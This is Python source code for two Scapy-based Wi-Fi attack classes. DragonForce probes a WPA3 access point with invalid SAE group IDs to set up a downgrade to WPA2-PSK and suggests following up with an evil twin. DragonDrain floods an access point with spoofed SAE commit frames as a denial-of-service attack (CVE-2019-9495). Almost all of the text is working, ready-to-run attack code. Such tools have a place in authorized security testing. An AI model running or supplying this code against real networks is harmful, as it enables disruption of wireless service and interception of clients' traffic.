class DragonForce:
    """SAE group downgrade probe - force AP to reject SAE and fall back to WPA2.

    Sends SAE Authentication commit frames with unsupported or invalid SAE
    group IDs (MODP groups 22/23/24 or arbitrary invalid groups) to trigger
    the AP's "Unsupported Group" rejection (status code 77). On WPA3-Transition
    mode APs, the rejection can be leveraged as the first step in a downgrade
    workflow that forces clients back to WPA2-PSK.

    Args:
        interface: Monitor mode wireless interface.
        bssid: Target AP BSSID.
        groups: List of SAE group IDs to probe. Defaults to MODP groups.
        count: Number of probe frames to send per group.
        interval: Seconds between frames. 0.0 sends at maximum speed.
        dry_run: If True, simulate without transmitting.
    """

    _DEFAULT_PROBE_GROUPS = list(_DRAGONFORCE_DEFAULT_GROUPS)

    def __init__(
        self,
        interface: str,
        bssid: str,
        groups: list[int] | None = None,
        count: int = 10,
        interval: float = 0.1,
        dry_run: bool = False,
    ) -> None:
        self._interface = interface.strip()
        self._bssid = bssid.upper().strip()
        self._groups = groups if groups is not None else list(self._DEFAULT_PROBE_GROUPS)
        self._count = max(count, 1)
        self._interval = max(interval, 0.0)
        self._dry_run = dry_run

    def _build_commit(self, group_id: int, src: str) -> Any:
        """Build a minimal SAE commit frame for a given group ID.

        Args:
            group_id: SAE group ID to embed in the commit body.
            src: Source MAC address string.

        Returns:
            Scapy packet ready for transmission.
        """
        group_bytes = group_id.to_bytes(2, byteorder="little")
        return (
            RadioTap()
            / Dot11(
                type=_DOT11_MGMT_TYPE,
                subtype=_DOT11_AUTH_SUBTYPE,
                addr1=self._bssid,
                addr2=src,
                addr3=self._bssid,
            )
            / Dot11Auth(algo=_SAE_ALGORITHM, seqnum=_SAE_COMMIT_SEQ, status=0)
            / group_bytes
        )

    def run(self) -> dict[str, Any]:
        """Probe the AP with unsupported SAE groups to assess downgrade risk.

        Returns:
            Dict with keys: groups_probed, frames_sent, recommendation.
        """
        if not HAS_SCAPY:
            print_error("Scapy not available. Install: pip install scapy")
            return {}

        if not self._interface or not self._bssid:
            print_error("interface and bssid are required.")
            return {}

        if self._dry_run:
            print_info(
                f"[dry-run] DragonForce: would probe groups {self._groups} "
                f"on {self._bssid} via {self._interface}, "
                f"{self._count} frames per group"
            )
            return {"groups_probed": self._groups, "frames_sent": 0, "dry_run": True}

        print_status(
            f"DragonForce: probing SAE group downgrade on {self._bssid} "
            f"via {self._interface}"
        )
        print_info(
            f"Groups to probe: {self._groups} ({self._count} frames each)"
        )
        print_info(
            "AP response status=77 (Unsupported Group) indicates the group "
            "is rejected. Repeated rejection across all MODP groups on a "
            "WPA3-Transition AP may enable a WPA2-PSK downgrade."
        )

        frames_sent = 0
        try:
            scapy_conf.verb = 0
            for group_id in self._groups:
                print_info(f"Probing SAE group {group_id}...")
                for _ in range(self._count):
                    src = _random_mac()
                    pkt = self._build_commit(group_id, src)
                    sendp(pkt, iface=self._interface, verbose=0)
                    frames_sent += 1
                    if self._interval > 0:
                        time.sleep(self._interval)
                print_info(
                    f"  Sent {self._count} commit frames with group={group_id}. "
                    "Capture AP responses with tcpdump or Wireshark to inspect "
                    "status codes."
                )
        except KeyboardInterrupt:
            print_info("Interrupted.")
        except PermissionError:
            print_error("Permission denied. Run as root.")
            return {}

        result: dict[str, Any] = {
            "groups_probed": self._groups,
            "frames_sent": frames_sent,
            "recommendation": (
                "Capture AP Auth responses with: "
                "tcpdump -i <iface> -w capture.pcap type mgt subtype auth. "
                "Filter for Dot11Auth status=77 to confirm unsupported groups. "
                "If all MODP groups are rejected and the AP is in Transition "
                "mode, a WPA2-PSK downgrade via evil twin may be feasible."
            ),
        }
        print_success(
            f"DragonForce probe complete. Frames sent: {frames_sent}."
        )
        return result


class DragonDrain:
    """SAE commit flood DoS attack (CVE-2019-9495).

    Sends a high-rate stream of SAE Authentication commit frames from
    randomized source MACs to exhaust SAE state machine resources on the
    target AP. The AP must allocate state for each commit even without
    completing the handshake, consuming CPU and memory as described in the
    Dragonblood research.

    Args:
        interface: Monitor mode wireless interface.
        bssid: Target AP BSSID.
        frame_count: Total frames to send. 0 runs until stopped.
        interval: Seconds between frames. 0.0 transmits at maximum speed.
        group_id: SAE group ID to include in commit body. Default 19 (P-256).
        dry_run: If True, simulate without transmitting.
        verbose: Print per-frame status output.
    """

    def __init__(
        self,
        interface: str,
        bssid: str,
        frame_count: int = 500,
        interval: float = 0.0,
        group_id: int = 19,
        dry_run: bool = False,
        verbose: bool = False,
    ) -> None:
        self._interface = interface.strip()
        self._bssid = bssid.upper().strip()
        self._frame_count = max(frame_count, 0)
        self._interval = max(interval, 0.0)
        self._group_id = group_id
        self._dry_run = dry_run
        self._verbose = verbose
        self._stop_event = threading.Event()

    def _build_commit(self, src: str) -> Any:
        """Build a SAE commit frame with specified source MAC.

        Args:
            src: Source MAC address string.

        Returns:
            Scapy packet ready for transmission.
        """
        group_bytes = self._group_id.to_bytes(2, byteorder="little")
        return (
            RadioTap()
            / Dot11(
                type=_DOT11_MGMT_TYPE,
                subtype=_DOT11_AUTH_SUBTYPE,
                addr1=self._bssid,
                addr2=src,
                addr3=self._bssid,
            )
            / Dot11Auth(algo=_SAE_ALGORITHM, seqnum=_SAE_COMMIT_SEQ, status=0)
            / group_bytes
        )

    def stop(self) -> None:
        """Signal the flood loop to terminate on the next iteration."""
        self._stop_event.set()

    def run(self) -> int:
        """Execute SAE commit flood.

        Returns:
            Number of frames successfully transmitted.
        """
        if not HAS_SCAPY:
            print_error("Scapy not available. Install: pip install scapy")
            return 0

        if not self._interface or not self._bssid:
            print_error("interface and bssid are required.")
            return 0

        count_label = (
            str(self._frame_count) if self._frame_count > 0 else "continuous"
        )

        if self._dry_run:
            print_info(
                f"[dry-run] DragonDrain: would send {count_label} SAE commit "
                f"frames to {self._bssid} via {self._interface}, "
                f"group={self._group_id}"
            )
            return 0

        print_status(
            f"DragonDrain SAE Commit Flood (CVE-2019-9495): "
            f"target={self._bssid}, iface={self._interface}, "
            f"frames={count_label}, group={self._group_id}"
        )
        print_info("Ctrl+C to stop.")

        self._stop_event.clear()
        sent = 0
        try:
            scapy_conf.verb = 0
            infinite = self._frame_count == 0
            while not self._stop_event.is_set():
                src = _random_mac()
                pkt = self._build_commit(src)
                sendp(pkt, iface=self._interface, verbose=0)
                sent += 1
                if self._verbose:
                    print_info(f"Frame #{sent}: src={src}")
                if not infinite and sent >= self._frame_count:
                    break
                if self._interval > 0:
                    time.sleep(self._interval)
        except KeyboardInterrupt:
            print_info("Interrupted by user.")
        except PermissionError:
            print_error("Permission denied. Run as root.")
            return sent
        except Exception as exc:
            print_error(f"DragonDrain error: {exc}")
            logger.exception("DragonDrain flood error")

        print_success(f"DragonDrain complete. Frames sent: {sent}")
        return sent


